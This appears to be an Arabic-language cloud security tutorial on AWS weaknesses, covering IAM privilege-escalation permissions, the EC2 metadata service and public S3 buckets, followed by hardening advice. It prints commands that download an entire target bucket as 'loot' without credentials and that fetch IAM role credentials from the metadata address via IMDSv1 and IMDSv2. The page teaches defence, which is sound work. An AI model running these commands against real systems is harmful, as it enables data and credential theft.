📚 النظرية — بنية خدمات AWS والعيوب الشائعة

تعتمد بنية حوسبة السحابية لشركة **Amazon Web Services (AWS)** على مفهوم المسؤولية المشتركة (Shared Responsibility Model). يتمثل الخطر الأكبر في عيوب التكوين (Misconfigurations) وسوء إدارة صلاحيات الهويات (IAM).

🔑 صلاحيات IAM وتصعيد الصلاحيات (Privilege Escalation)

تتحكم سياسات **IAM Policies** في الصلاحيات الممنوحة للمستخدمين والخدمات. يمكن لبعض السياسات المهملة أو الفضفاضة (Wildcard statements) أن تتيح لمستخدم محدود تصعيد صلاحياته ليصبح مسؤول النطاق (Administrator):

  • iam:CreateAccessKey: القدرة على إنشاء مفتاح وصول جديد لأي مستخدم بما في ذلك المسؤولين.
  • iam:PutUserPolicy: القدرة على إضافة أو تعديل سياسة الصلاحيات الخاصة بالمستخدم نفسه لحقن صلاحيات Administrator.
  • iam:PassRole: تمرير دور (Role) يتمتع بصلاحيات أعلى لخدمة أخرى (مثل EC2) لتشغيلها والسيطرة عليها.

🛡️ خادم بيانات الوصف الافتراضي (EC2 Metadata Service)

يوفر خادم الـ **IMDS (Instance Metadata Service)** معلومات تفصيلية عن الـ EC2 النشطة ومفاتيح الـ IAM Role المؤقتة الممنوحة لها عبر عنوان IP ثابت داخلي 169.254.169.254.

  • IMDSv1: يعتمد على طلب GET بسيط. يسهل استغلاله عبر ثغرات SSRF للحصول على مفاتيح الوصول الحساسة.
  • IMDSv2: يتطلب مصادقة ثنائية الخطوات تعتمد على جلسة (Session token) للحماية ضد هجمات SSRF البسيطة.

S3 Bucket Enumeration & Leaks

البحث عن مخازن البيانات المفتوحة للعامة (Publicly accessible S3 buckets) وسحب محتوياتها.

# List files in a public S3 bucket using AWS CLI (without credentials) aws s3 ls s3://target-leaked-bucket --no-sign-request # Download entire bucket contents aws s3 sync s3://target-leaked-bucket ./local_loot --no-sign-request
2️⃣
Extracting Temporary IAM Keys from IMDS

استغلال ثغرة SSRF داخل تطبيق مستضاف على EC2 لسحب مفاتيح الصلاحيات المؤقتة:

# Fetch IAM Role credentials via IMDSv1 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/production-web-role # Fetch IAM Role credentials via IMDSv2 (requires token generation) TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/production-web-role

🛡️ الحماية والدفاع — تأمين بيئة AWS السحابية

✅ تأمين هويات وصلاحيات IAM

  • Principle of Least Privilege: حظر الصلاحيات الواسعة أو النجمية (Wildcards) وتخصيص سياسات الصلاحيات للخدمات بأقل قدر ممكن وبشكل محدد.
  • Enforce IMDSv2: إيقاف دعم IMDSv1 على خوادم EC2 وجعل استخدام IMDSv2 إجبارياً للحد من ثغرات SSRF.

🔒 تحصين مخازن البيانات S3

  • Block Public Access: تفعيل خيار حظر الوصول العام بالكامل على مستوى الحساب والمخزن السحابي (S3 Block Public Access).
  • Bucket Policies: مراجعة سياسات الوصول (Bucket Policies) للتأكد من عدم وجود سماح بالوصول لغير المستخدمين الموثقين.
